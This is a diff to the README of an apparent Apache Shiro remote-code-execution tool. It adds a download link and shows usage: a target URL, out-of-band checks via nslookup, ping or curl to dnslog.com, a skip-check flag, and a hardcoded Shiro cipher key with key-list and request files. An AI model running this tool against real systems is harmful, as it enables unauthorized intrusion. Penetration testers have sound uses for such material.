@@ -1,6 +1,11 @@
 # shiro_rce
 
 ```
+2020-04-24:
+download_url:  https://xz.aliyun.com/forum/upload/affix/shiro_tool.zip
+
+
+
 java -cp shiro_tool.jar Shiro https://xx.xx.xx.xx nslookup/ping1/ping2/curl nocheck key=kPH+bIxk5D2deZiIxcaaaA== req=1.txt keys=key.txt
 nslookup/ping1/ping2/curl--> use nslookup dnslog.com check./use ping -c 1 dnslog.com check(default)./use ping -n 1 dnslog.com check./use curl dnslog.com check.
 nocheck --> skip check target is shiro or not.
